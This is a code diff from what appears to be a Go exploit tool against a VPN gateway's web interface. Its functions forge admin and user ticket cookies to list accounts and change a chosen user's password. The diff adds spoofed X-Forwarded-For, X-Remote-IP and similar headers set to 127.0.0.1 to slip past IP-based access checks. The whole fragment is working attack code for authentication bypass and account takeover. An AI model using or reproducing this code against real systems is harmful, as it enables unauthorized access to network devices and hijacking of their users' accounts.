@@ -12,7 +12,12 @@ import (
 )
 
 func (v *vpnConnect) getUserList() {
-	headers := map[string]string{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"}
+	headers := map[string]string{
+		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
+		"X-Forwarded-For": "127.0.0.1",
+		"X-Originating":   "127.0.0.1",
+		"X-Remote-IP":     "127.0.0.1",
+		"X-Remote-Addr":   "127.0.0.1"}
 	headers["cookie"] = "gw_admin_ticket=1"
 	v.users = make([]string, 0)
 	client := resty.New()
@@ -53,7 +58,14 @@ func (v *vpnConnect) changePassword() {
 	fmt.Scanf("%d\n", &index)
 	log.SetPrefix("[*] ")
 	log.Printf("Trying To Change User %s's Password.", v.users[index])
-	headers := map[string]string{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded"}
+	headers := map[string]string{
+		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
+		"Content-Type":    "application/x-www-form-urlencoded",
+		"X-Forwarded-For": "127.0.0.1",
+		"X-Originating":   "127.0.0.1",
+		"X-Remote-IP":     "127.0.0.1",
+		"X-Remote-Addr":   "127.0.0.1",
+	}
 	headers["cookie"] = fmt.Sprintf(`PHPSESSID=%s;gw_user_ticket=ffffffffffffffffffffffffffffffff; user_lang_id=2; last_step_param={"this_name": "%s","subAuthId": "1"}`, v.cookie, v.users[index])
 	client := resty.New()
 	client.SetHeaders(headers)
